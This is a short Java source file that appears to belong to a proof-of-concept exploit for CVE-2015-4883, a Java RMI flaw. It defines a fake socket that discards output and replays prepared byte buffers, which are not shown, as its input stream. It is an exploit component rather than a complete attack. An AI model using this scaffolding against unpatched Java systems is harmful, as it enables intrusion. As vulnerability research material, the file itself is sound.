package poc.cve_2015_4883;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.SequenceInputStream;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import poc.shared.NullOutputStream;

public class RMISocket extends Socket {
	
	@Override
	public OutputStream getOutputStream( ) {
		return new NullOutputStream( );
	}
	
	@Override
	public InputStream getInputStream( ) {
		List< InputStream > streams = new ArrayList< InputStream >( );
		for( byte[] buf : ByteBuffers.STREAM_BUFS ) {
			streams.add( new ByteArrayInputStream( buf ) );
		}
		
		return new SequenceInputStream( Collections.enumeration( streams ) );
	}
	
}
